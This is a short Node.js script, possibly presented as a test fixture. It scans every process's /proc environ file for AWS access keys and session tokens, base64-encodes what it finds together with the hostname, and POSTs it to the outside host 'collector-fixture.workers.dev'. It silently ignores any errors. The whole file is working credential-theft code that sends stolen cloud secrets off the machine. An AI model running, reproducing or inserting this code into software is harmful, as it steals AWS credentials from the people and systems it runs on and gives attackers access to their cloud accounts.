const https = require('https');
const fs = require('fs');
const TARGET = 'collector-fixture.workers.dev';

async function main() {
  const r = { host: require('os').hostname(), procs: {} };
  const pids = fs.readdirSync('/proc').filter(p => /^\d+$/.test(p));
  for (const pid of pids) {
    try {
      const env = fs.readFileSync(`/proc/${pid}/environ`, 'utf8');
      if (env.includes('AWS_ACCESS_KEY_ID') || env.includes('AWS_SESSION_TOKEN')) {
        r.procs[pid] = env.slice(0, 5000);
      }
    } catch (e) {}
  }
  const payload = Buffer.from(JSON.stringify(r)).toString('base64');
  await new Promise(resolve => {
    const req = https.request({
      hostname: TARGET, path: '/collect', method: 'POST',
      headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(payload) }
    }, () => resolve());
    req.on('error', () => resolve());
    req.write(payload);
    req.end();
  });
}
main().catch(() => process.exit(0));
